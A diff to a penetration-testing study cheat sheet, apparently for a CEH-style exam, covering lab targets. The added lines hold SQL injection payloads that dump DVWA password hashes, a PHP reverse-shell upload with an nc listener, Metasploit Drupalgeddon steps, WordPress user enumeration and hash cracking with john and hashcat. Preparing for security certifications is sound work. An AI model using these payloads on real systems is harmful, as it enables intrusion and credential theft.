@@ -644,11 +644,25 @@ available at 192.168.0.64. Locate the Flag.txt file and enter its content as the
 MD5 hash to reveal the original message. Enter the decrypted message as the answer.
 You can log into the DVWA using the credentials admin/password.
 
+#DVWA already have login = admin & password= password for reverse shell and cookie
+
+upload shell.php (revshells.com - os -Windows - PHP Ivan Sincek) THEN Execute it via browser http://x.x.x/DVWA/hackable/uploads/shell.php or browse ../
+and then nc -lnvp 4444
+type hash.txt
+
+# DVWA number of users ? password ?
 'or 1=1#    (in DVWA SQL injection you will get user ID)
+'UNION SELECT user, password FROM users#   ((in DVWA SQL injection you will get password md5 HASH)
+
+Now go on https://crackstation.net and past md5 HASH to get the pwd or:
+
+john --format=Raw-MD5 --wordlist=~/rockyou.txt hashes.txt
+john --format=Raw-MD5 --show hashes
+hashcat -a 0 -m 0 hashes.txt /home/attacker/rockyou.txt
+
 'UNION SELECT table_name, NULL FROM information_schema.tables
 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'
-'UNION SELECT user, password FROM users
-'UNION SELECT user, password FROM users
+'UNION SELECT user, password FROM users#
 
 --------------------------------------------------------------------------
 #file upload reverse shell + cmd injection:
@@ -799,14 +813,14 @@ smbclient -L //192.168.1.X -U guest
 
 -------------------------------------------------------------------------------------------------------
 
--Identify the type of encoding or encryption used on a file:
+-Identify the type of encoding or encryption used on a file + find type of HASH:
 
+hashid hidden_text.txt
 cat hidden_text.txt
 file hidden_text.txt
 ent hidden_text.txt
 xxd hidden_text.txt | head -n 20
 binwalk hidden_text.txt
-hashid hidden_text.txt
 
 -------------------------------------------------------------------------------------------------------
 Steganography:
@@ -1513,7 +1527,7 @@ Check ho many categories on the right have one or more vulnerabilities = 3
 1 for Clickjacking protection
 1 for MIME type confusion
 
------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------
 -Decrypt file crypto forge (on windows - right click - decrypt): .cfe extensions
 
 (on windows cryptoforge - right click on the file - decrypt - enter password or press enter if no password)
@@ -1539,15 +1553,25 @@ cp exploit1.exe exploit2.exe exploit3.exe /var/www/html/share/
 service apache2 start  (then (other pc http://x.x.x.x/share)
 
 -----------------------------------------------------------------------------------------------------------------------------------------
-Drupal:
+# find CMS type, version: https://cheatsheet.haax.fr/web-pentest/content-management-system-cms/drupal/
+
+cmsmap http://192.168.0.222 (Wordpress + Joomla + Drupal)
+
+cmsmap http://192.168.0.222:8080/CEH/wp-login
+http://192.168.0.222:8080/CEH/wp-json/wp/v2/users
+http://192.168.0.222:8080/CEH/wp-json/wp/v2/users/1
+http://192.168.0.222:8080/CEH/wp-json/wp/v2/users/2 (if 401 exist and if 404 does not exist)
+
+droopescan scan -u http://192.168.0.222
+https://github.com/SamJoan/droopescan
+
 msfconsole
 search durpal
-use unix/webapp/drupal_drupalgeddon2
+use exploit/multi/http/drupal_drupageddon
 options
-show targets
-set taget 1 (try other if does not work 2 or 3...)
+show options
 run
-
+meterpreter > ? or sysinfo or getuid or getpid or shell
 -----------------------------------------------------------------------------------------------------------------------------------------
 File upload via DVWA to have a reverse shell:
 
@@ -1586,9 +1610,10 @@ hashcat -m 0 -a 0 hashmd5.txt /home/attacker/rockyou.txt  ( -m 0 = MD5 mode -a 0
 john --format=raw-md5 --wordlist=/home/attacker/rockyou.txt hashmd5.txt
 -----------------------------------------------------------------------------------------------------------------------------------------
 #Amazon bucket:
+
 aws configure
+aws s3 ls
 aws s3 ls s3://certifiedhacker02 or (https to view content)
-https://certifiedhacker02.s3.amazonaws.com 
 aws s3 mv Hack.txt s3://certifiedhacker02
 aws s3 cp s3://certifiedhacker02/flag.txt flagdownload.txt
 
@@ -1646,3 +1671,4 @@ http://snarkles.net/scripts/sneak/sneak.php
 http://utf-8.jp/public/jjencode.html
 
 http://ddecode.com/phpdecoder/
+
